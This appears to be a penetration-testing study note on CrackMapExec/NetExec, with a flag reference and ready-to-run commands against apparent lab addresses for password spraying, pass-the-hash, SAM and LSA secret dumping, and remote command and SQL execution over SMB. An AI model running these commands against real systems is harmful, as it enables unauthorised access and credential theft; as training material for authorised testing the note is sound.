---
tags:
  - Tools
  - Windows
  - Active-Directory
  - SMB
  - WinRM
  - MSSQL
  - Offensive
  - Post-Exploitation
---
## Function
> **CrackMapExec (CME)** (modern successor: **NetExec / `nxc`**) is a post-exploitation Swiss Army knife designed to assess, enumerate, and attack Windows networks and Active Directory domains. It automates credential validation, network-wide password spraying, share enumeration, privilege dumping, and remote command execution across multiple protocols (SMB, WinRM, MSSQL, LDAP, RDP, and SSH).

---
## Connection Syntax
```shell
crackmapexec <protocol> <target_IP_or_CIDR> [options]
# Modern NetExec syntax:
nxc <protocol> <target_IP_or_CIDR> [options]
```

### Supported Protocols:
| Protocol | Port | Primary Use Case |
| :--- | :--- | :--- |
| `smb` | 445 / 139 | Share enumeration, user discovery, SAM dumping, command execution. |
| `winrm` | 5985 / 5986 | Remote PowerShell execution & credential check. |
| `mssql` | 1433 | SQL Server login check, queries, and `xp_cmdshell` execution. |
| `rdp` | 3389 | Remote desktop credential validation & screenshotting. |
| `ldap` | 389 / 636 | Active Directory domain user, group, and policy enumeration. |
| `ssh` | 22 | Linux & network appliance credential checking. |

---
## Output Status Indicators
| Badge | Meaning |
| :--- | :--- |
| `[-]` *(Red)* | Authentication failed (invalid user or wrong password). |
| `[+]` *(Green)* | Authentication successful (valid credentials). |
| `[+] ... (Pwn3d!)` | Authentication successful **AND the account has local Administrator rights**. |

---
## Options :

| **Flag** | **Argument** | **Description** |
| :--- | :--- | :--- |
| `-u` | `<user>` or `<file>` | Username or wordlist of usernames to spray. |
| `-p` | `<pass>` or `<file>` | Password or wordlist of passwords to test. |
| `-H` | `<hash>` | NTLM hash for Pass-The-Hash (`LM:NT` or just `NT`). |
| `-d` | `<domain>` | Specify domain name (omit or use `.` / `hostname` for local auth). |
| `--local-auth` | None | Forces authentication against the local SAM instead of domain. |
| `--shares` | None | Enumerates all network shares and inspects read/write permissions. |
| `--users` | None | Enumerates local or domain user accounts. |
| `--sam` | None | Dumps the local SAM database hashes (requires Administrator / Pwn3d!). |
| `--lsa` | None | Dumps LSA secrets (stored credentials, service accounts). |
| `-x` | `<cmd>` | Executes a command on the target via Windows CMD. |
| `-X` | `<ps_cmd>` | Executes a command on the target via Windows PowerShell. |
| `--continue-on-success` | None | Continues testing other credentials even after finding a valid login. |

---
## Common Use Cases & Real-World Examples

### 1. SMB Credential Checking & Password Spraying
```bash
# Validating single credential:
crackmapexec smb 10.129.202.41 -u 'alex' -p 'lol123!mD'

# Null Session / Anonymous check:
crackmapexec smb 10.129.202.41 -u '' -p ''

# Password spray across an entire subnet:
crackmapexec smb 10.129.202.0/24 -u 'Administrator' -p 'Spring2026!'

# Pass-The-Hash:
crackmapexec smb 10.129.202.41 -u 'Administrator' -H '048ebd31f3d1fea0cd231aac608f5b28'
```

### 2. Share Enumeration
```bash
# Inspect readable and writable shares:
crackmapexec smb 10.129.202.41 -u 'alex' -p 'lol123!mD' --shares
```

### 3. Dumping Hashes (Requires Admin / `Pwn3d!`)
```bash
# Dump SAM database (retrieves NTLM hashes for all local users):
crackmapexec smb 10.129.202.41 -u 'Administrator' -p '87N1ns@slls83' --sam

# Dump LSA secrets:
crackmapexec smb 10.129.202.41 -u 'Administrator' -p '87N1ns@slls83' --lsa
```

### 4. Remote Execution & SQL Footprinting (Lab Technique)
```bash
# Execute OS command directly:
crackmapexec smb 10.129.202.41 -u 'Administrator' -p '87N1ns@slls83' -x 'whoami /all'

# Query internal MSSQL database via sqlcmd over SMB (Bypasses firewalled port 1433):
crackmapexec smb 10.129.202.41 -u 'Administrator' -p '87N1ns@slls83' -x 'sqlcmd -E -d accounts -Q "SELECT * FROM devsacc"'
```

---
## Related Source : 
[[SMBMap]], [[smbclient]], [[SQL Syntax & Footprinting]], [[CPTS/Footprinting/Sections/Windows Remote Management Protocols|Windows Remote Management Protocols]]
